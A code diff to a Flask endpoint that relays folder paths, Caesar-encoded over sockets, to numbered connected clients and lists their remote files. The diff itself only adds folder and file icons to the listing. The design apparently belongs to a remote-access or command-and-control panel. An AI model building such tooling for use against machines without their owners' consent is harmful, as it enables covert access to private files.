@@ -75,6 +75,7 @@ def get_data() :
     got_path = request.get_data().decode("latin-1")
     got_path = urllib.parse.unquote_plus(got_path)
     if got_path and got_path != "{}" :
+        if "img" in got_path : got_path = got_path.split("centered\">")[1]
         got_path = got_path.replace("<a>","").replace("</a>","").replace("folder_path=","")
 
         if got_path == ".." :
@@ -120,6 +121,7 @@ def get_data() :
             client_num = int(path_parts.pop(0).replace("Client n°",""))
             if client_num != i : continue
             path_parts[0] = path_parts[0] + ":"
+
             path_file_ex_2 = '/'.join(path_parts)
             client.send(CAESAR(path_file_ex_2 + "\0").encode())
             
@@ -135,7 +137,18 @@ def get_data() :
                 infos = recv_message_ret(client).decode("latin-1")
                 taille, modified = infos.split("/")
                 
-                data.append({"url": f"<a>{f}</a>", "modified": f"{modified}", "size":f"{convert_size(int(taille))}"})
+                is_dir = False
+                if taille != "N" :
+                    taille = convert_size(int(taille))
+                    if taille == "0 O" :
+                        is_dir = True
+                
+                if is_dir :
+                    data.append({"url": f"<img src=\"images/folder.png\" alt=\"Folder Icon\" class=\"mr-3\" id=\"folder\" /><a class=\"centered\">{f}</a>",
+                                 "modified": f"{modified}", "size": f"{taille}"})
+                else :
+                    data.append({"url": f"<img src=\"images/file.png\" alt=\"File Icon\" class=\"mr-3\" id=\"folder\" /><a class=\"centered\">{f}</a>",
+                                 "modified": f"{modified}", "size": f"{taille}"})
                 
     json_data = jsonify({"data":data})
     return json_data
